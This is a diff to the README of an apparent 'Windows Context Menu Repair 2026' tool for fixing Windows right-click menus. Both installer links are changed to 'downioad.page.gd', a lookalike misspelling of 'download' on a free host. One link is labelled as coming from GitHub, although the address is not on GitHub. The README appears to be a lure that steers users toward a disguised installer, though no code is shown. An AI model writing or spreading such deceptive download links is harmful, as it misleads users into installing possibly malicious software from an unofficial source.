@@ -2,7 +2,7 @@
 
 Windows Context Menu Repair 2026 is a lightweight and user-friendly tool designed to help you fix and restore right-click menu errors on Windows 10 and 11. Whether your context menu is missing entries, not responding, or displaying incorrect options, this utility provides a simple, one-click solution to diagnose and resolve these issues efficiently.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Features
 
@@ -64,7 +64,7 @@ Windows Context Menu Repair 2026 operates by scanning key registry locations whe
 
 For the latest version and updates, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Version Information
 
